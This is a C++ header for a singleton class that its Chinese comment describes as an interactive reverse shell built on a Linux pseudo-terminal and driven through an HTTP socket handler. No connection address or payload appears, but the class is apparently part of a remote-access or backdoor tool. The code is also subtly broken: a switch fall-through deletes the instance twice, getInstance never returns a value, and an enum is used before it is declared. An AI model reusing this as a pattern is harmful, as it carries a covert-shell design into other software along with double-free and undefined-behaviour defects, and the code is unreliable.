#ifndef _SSHD_
#define _SSHD_
#include <iostream>
#include <vector>
#include <memory>
#include <unistd.h>
#include "net/HttpRequest.h"
#include "net/Buffer.h"
#include "FileManager.h"

/**
 * @brief 基于linux伪终端的交互式反弹shell
 * @design 单例模式，不反回对象指针, 只暴露getInstance接口
 */

class SShd {
public:
    static int getInstance(int fd) {
        if (sshd_ == nullptr) {
            sshd_ = new SShd(fd);
        }

        switch (sshd_->runshell()) {
            case CLOSE:
                delete sshd_;
            case ERROR:
                delete sshd_;
        }
    }

    ~SShd() {
        delete httpHandler_;
        close (fd_);
    }

private:
    SShd(int fd) : fd_(fd), httpHandler_(new HttpRequest(fd)) {
        init();
    }

    // 初始化一个伪终端
    void init();

    // 二次进入loop
    void reset();

    // core shell-loop
    int runshell();

    // 伪终端事件,自定义，不是回调
    int  _events_pty_readable();
    int  _events_pty_writable();
    void _events_pty_close();
    int  _events_CC_readable();

    // 拓展命令
    int _setNonBlock(int fd);

    int    fd_;
    int    tty_;  // slave side
    int    pty_;  // master side
    string cmd_;
    bool   filter_;
    bool   login_filter_;

    HttpRequest* httpHandler_;
    static SShd* sshd_;
    Buffer       _outBuff;

    enum ReturnNum {
        SUCCESS = -100,
        ERROR,
        CLOSE,
    };
};
#endif